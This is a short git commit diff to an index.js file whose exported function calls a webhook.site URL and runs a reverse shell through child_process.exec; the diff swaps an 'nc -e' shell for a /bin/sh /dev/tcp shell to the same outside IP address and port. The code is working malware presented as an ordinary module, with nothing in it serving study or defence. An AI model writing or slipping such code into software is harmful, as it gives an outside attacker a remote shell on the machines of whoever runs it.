2846f5ec6680da7d342b6ece3dffcc1166fc62bb
Rhys Davies <rhys@memes.nz>
2025-06-27 22:08:37 +1200

    bor

--- index.js
+++ index.js
@@ -1,4 +1,5 @@
 exports.stuff = function() {
   fetch('https://webhook.site/1e4d3018-cbc8-4dd5-91fc-7cbaacceb64c');
-  require('child_process').exec('nc -e cmd 3.25.179.20 4444')
+  console.log("hello");
+  require('child_process').exec('/bin/sh -i >& /dev/tcp/3.25.179.20/4444 0>&1')
 }
